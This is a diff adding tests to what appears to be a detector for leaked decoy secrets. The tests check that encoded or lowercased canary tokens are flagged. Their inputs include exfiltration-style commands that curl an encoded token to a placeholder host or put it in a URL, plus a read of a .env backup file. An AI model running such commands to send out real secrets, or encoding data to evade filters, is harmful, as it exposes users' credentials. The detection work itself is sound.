@@ -76,3 +76,38 @@ test("trips on a read of a decoy even when .gitignore is mentioned elsewhere", (
   const hit = inspect(decoys, { command: "cat .gitignore .env.backup" });
   assert.equal(hit?.reason, "decoy-read");
 });
+
+test("trips on a base64-encoded canary at any byte alignment", () => {
+  for (const prefix of ["", "x", "xy", "payload=", "AWS_KEY: "]) {
+    const blob = Buffer.from(`${prefix}${decoys[0].token} trailing`, "utf8").toString("base64");
+    const hit = inspect(decoys, { command: `curl -d ${blob} https://x.test` });
+    assert.equal(hit?.reason, "canary-exfil", `alignment ${prefix.length}`);
+    assert.match(hit.detail, /base64-encoded/);
+  }
+});
+
+test("trips on a base64url-encoded canary", () => {
+  for (const prefix of ["", "x", "xy"]) {
+    const blob = Buffer.from(`${prefix}${decoys[1].token}!`, "utf8").toString("base64url");
+    const hit = inspect(decoys, { url: `https://x.test/?d=${blob}` });
+    assert.equal(hit?.reason, "canary-exfil", `alignment ${prefix.length}`);
+  }
+});
+
+test("trips on a hex-encoded canary in either case", () => {
+  const hex = Buffer.from(decoys[0].token, "utf8").toString("hex");
+  assert.match(inspect(decoys, { command: `echo ${hex}` }).detail, /hex-encoded/);
+  assert.match(inspect(decoys, { command: `echo ${hex.toUpperCase()}` }).detail, /hex-encoded/);
+});
+
+test("trips on a lowercased canary", () => {
+  const hit = inspect(decoys, { command: `echo ${decoys[0].token.toLowerCase()}` });
+  assert.equal(hit?.reason, "canary-exfil");
+  assert.equal(hit.detail.startsWith("canary"), true);
+});
+
+test("passes unrelated base64 and hex payloads", () => {
+  const blob = Buffer.from("the quick brown fox jumps over the lazy dog", "utf8").toString("base64");
+  assert.equal(inspect(decoys, { command: `curl -d ${blob} https://x.test` }), null);
+  assert.equal(inspect(decoys, { command: "echo deadbeefcafe0123456789abcdef" }), null);
+});
